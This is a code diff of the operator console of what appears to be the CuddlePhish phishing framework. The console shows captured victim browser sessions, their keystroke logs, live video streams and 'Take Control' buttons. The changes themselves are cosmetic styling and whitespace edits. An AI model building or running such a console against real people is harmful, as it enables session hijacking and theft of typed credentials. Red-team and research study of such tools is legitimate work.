@@ -9,7 +9,7 @@
     <link rel="stylesheet" href="/static/css/bootstrap.css" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
   </head>
-  <body class="overflow-auto bg-dark">
+  <body class="overflow-auto bg-dark" style="background-color: rgb(6, 8, 24) !important;">
     <nav class="navbar sticky-top navbar-expand-lg navbar-dark justify-content-center mb-3" id="navbar" style="background-color: #191E3A !important;">
       <a href="https://github.com/fkasler"><img src="/images/CuddlePhish.png" alt="Logo" width="100" height="94" class="nav-item" /></a>
       <ul class="form-check form-switch nav-item">
@@ -34,16 +34,16 @@ html, body {margin: 0; height: 100%; overflow: hidden}
 
 //couple of helper functions
 function width(){
-  return window.innerWidth
-  || document.documentElement.clientWidth
-  || document.body.clientWidth
+  return window.innerWidth 
+  || document.documentElement.clientWidth 
+  || document.body.clientWidth 
   || 0;
 }
 
 function height(){
-  return window.innerHeight
-  || document.documentElement.clientHeight
-  || document.body.clientHeight
+  return window.innerHeight 
+  || document.documentElement.clientHeight 
+  || document.body.clientHeight 
   || 0;
 }
 
@@ -73,7 +73,7 @@ socket.on("thumbnail", function(browser_id, thumbnail_blob, keylog){
             <button type="button" id="takeover_${browser_id}" class="btn btn-outline-warning takeover"><i class="fas fa-sack-dollar" style="color: green;"></i><em> Take Control</em></button>\
           </div>
           <div class="btn-group">\
-            <button type="button" id="remove_${browser_id}" class="btn btn-outline-warning remove"><i class="fas fa-trash-alt" style="color: crimson;"></i><em> Delete Session</em></button>\
+            <button type="button" id="remove_${browser_id}" class="btn btn-outline-warning remove"><i class="fas fa-trash-alt" style="color: crimson;"></i><em> Delete Session</em></button>\ 
           <div class="btn-group dropend">\
             <button type="button" class="btn btn-outline-info dropdown-toggle" data-bs-toggle="dropdown" aria-expanded="false"><i class="fa-solid fa-gear"></i> Other  </button>\
             <ul class="dropdown-menu" data-bs-theme="dark">\
@@ -83,8 +83,9 @@ socket.on("thumbnail", function(browser_id, thumbnail_blob, keylog){
             </ul>\
           </div>\
         </div> \
-        <div class="card-footer"> \
-	  <h6 style="color: aqua;">ID: <small class="text-muted" style="color: red !important">${browser_id}</small> Keylog:</h6> \
+        <br></br> \
+        <div> \
+          <p style="color: aqua;">Keylog:</p> \
           <small class="keylog text-muted" id="keylog_${browser_id}" style="color: red !important"></small> \
         </div> \
       </div> \
@@ -163,7 +164,7 @@ socket.on("video_stream_offer", function(broadcaster_socket_id, offer){
       {
         "urls": "stun:stun.l.google.com:19302",
       },
-      // {
+      // { 
       //   "urls": "turn:TURN_IP?transport=tcp",
       //   "username": "TURN_USERNAME",
       //   "credential": "TURN_CREDENTIALS"
@@ -177,7 +178,7 @@ socket.on("video_stream_offer", function(broadcaster_socket_id, offer){
     .then(sdp => peerConnection.setLocalDescription(sdp))
     .then(() => {
       socket.emit("video_stream_answer", broadcaster_socket_id, peerConnection.localDescription)
-    })
+    }) 
   //add video track when it becomes available
   peerConnection.ontrack = function(event){
     mainVideo.srcObject = event.streams[0]
@@ -187,7 +188,7 @@ socket.on("video_stream_offer", function(broadcaster_socket_id, offer){
     if (event.candidate) {
       socket.emit("candidate", broadcaster_socket_id, event.candidate)
     }
-  }
+  }  
 })
 
 socket.on("candidate", function(broadcaster_socket_id, candidate){
@@ -201,11 +202,11 @@ var peerConnection;
 var driving = false;
 
 //joystick actions for mouse events
-document.addEventListener("mousedown", handleMouseEvent, !1)
-document.addEventListener("mouseup", handleMouseEvent, !1)
-document.addEventListener("mousemove", handleMouseEvent, !1)
-document.addEventListener("mousewheel", handleMouseEvent, !1)
-document.addEventListener("click", handleMouseEvent, !1)
+document.addEventListener("mousedown", handleMouseEvent, !1) 
+document.addEventListener("mouseup", handleMouseEvent, !1) 
+document.addEventListener("mousemove", handleMouseEvent, !1) 
+document.addEventListener("mousewheel", handleMouseEvent, !1) 
+document.addEventListener("click", handleMouseEvent, !1) 
 
 window.addEventListener('popstate', function(event){
   socket.emit('go_back')
@@ -253,7 +254,7 @@ function keyDown(e) {
       $("#browsers").show()
       $("#navbar").show()
       return
-    }
+    }  
     if(e.key == 'Meta'){
       ctrlKey = true
       return
